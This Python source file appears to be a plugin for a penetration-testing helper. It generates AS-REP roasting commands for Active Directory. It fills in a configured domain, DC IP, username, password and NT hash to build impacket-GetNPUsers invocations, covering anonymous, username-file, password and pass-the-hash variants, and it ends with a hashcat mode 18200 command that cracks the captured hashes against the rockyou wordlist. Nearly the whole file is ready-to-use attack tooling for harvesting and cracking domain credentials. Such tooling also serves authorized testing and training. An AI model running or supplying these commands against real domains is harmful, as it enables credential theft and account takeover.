from Command import Command
from Util import getarg

class CommandImpacketGetNPUsers(Command):
    def __init__(self, name: str, config: dict[str, str], tags : list[str]):
        super().__init__(name, config, tags)
        conf = config['ADDefaults']
        self.defaultDcIp = conf['dcIp']
        self.defaultDcHostname = conf['dcHostname']
        self.defaultDomain = conf['domain']
        self.defaultDomainSID = conf['domainSid']
        self.defaultUsername = conf['username']
        self.defaultPassword = conf['password']
        self.defaultNtHash = conf['ntHash']


    def matchesTrigger(self, trigger : str) -> bool:
        triggerLower = trigger.lower()
        triggers = ['impacket-getnpusers', 'getnpusers', 'npusers', 'asreproast']
        return any(word in triggerLower for word in triggers)


    def getHelp(self) -> str:
        return 'impacket-getnpusers'


    def genCommands(self, trigger: str, args: list[str]) -> list[str]:
        dom = self.defaultDomain
        user = self.defaultUsername
        pw = self.defaultPassword
        dcIp = self.defaultDcIp
        ntHash = self.defaultNtHash

        outputfile = 'asreproastable.txt'
        usersfile = 'users.txt'
        req = f'-request -format hashcat -outputfile {outputfile}'

        commands = []
        commands.append('# Trying to find users via anonymous LDAP session')
        commands.append(f'impacket-GetNPUsers {dom}/ -dc-ip {dcIp} -no-pass')
        commands.append(f'impacket-GetNPUsers {dom}/ -dc-ip {dcIp} -no-pass {req}')
        commands.append('')
        commands.append('# No authentication, use username file')
        commands.append(f'impacket-GetNPUsers {dom}/ -dc-ip {dcIp} -no-pass -usersfile {usersfile}')
        commands.append(f'impacket-GetNPUsers {dom}/ -dc-ip {dcIp} -no-pass -usersfile {usersfile} {req}')
        commands.append('')
        commands.append('# Authenticate with password, find usrs via LDAP')
        commands.append(f"impacket-GetNPUsers {dom}/{user}:'{pw}' -dc-ip {dcIp}")
        commands.append(f"impacket-GetNPUsers {dom}/{user}:'{pw}' -dc-ip {dcIp} {req}")
        commands.append('')
        commands.append('# Authenticate with hash, find users via LDAP')
        commands.append(f"impacket-GetNPUsers {dom}/{user} -hashes :{ntHash} -dc-ip {dcIp}")
        commands.append(f"impacket-GetNPUsers {dom}/{user} -hashes :{ntHash} -dc-ip {dcIp} {req}")
        commands.append('')
        commands.append('# Crack')
        commands.append(f'hashcat -m 18200 {outputfile} /usr/share/wordlists/rockyou.txt -O')

        return commands
